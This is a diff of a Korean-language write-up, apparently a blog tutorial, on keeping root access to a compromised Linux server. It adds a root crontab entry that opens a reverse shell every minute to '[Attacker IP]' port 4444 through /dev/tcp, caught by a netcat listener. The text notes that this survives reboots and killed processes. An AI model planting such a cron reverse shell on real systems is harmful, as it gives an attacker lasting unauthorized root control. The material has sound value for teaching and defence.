@@ -44,13 +44,13 @@ nc -lvnp 4444
 #### **2. 대상 서버에 cron 작업 등록**
 획득한 `root` 쉘에서 `root` 사용자의 crontab에 1분마다 리버스 쉘을 실행하는 작업을 추가한다. `crontab -e`를 사용하는 대신 `echo`와 파이프를 이용하여 비대화형(non-interactive) 방식으로 작업을 등록할 수 있다.
 ```bash
-# 기존 crontab 내용을 유지하면서 새 작업을 추가
-(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1") | crontab -
+(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/[Attacker IP]/4444 0>&1'") | crontab -
 ```
+   ![CronShell](/assets/images/Cron_1.png)
 
 #### **3. 연결 수신 확인**
 cron 작업이 등록되고 1분 이내에 공격자 PC의 `netcat` 리스너는 대상 서버로부터 들어오는 `root` 권한의 쉘 연결을 수신하게 된다.
-   ![CronShell](/assets/images/Cron_1.png)
+   ![Cronauto](/assets/images/Cron_2.png)
 
 이제 대상 서버가 재부팅되거나 다른 관리자가 악성 프로세스를 종료시키더라도 `cron` 데몬은 매 분마다 공격자에게 다시 쉘을 제공하므로 공격자는 시스템에 대한 통제권을 잃지 않게 된다.
 
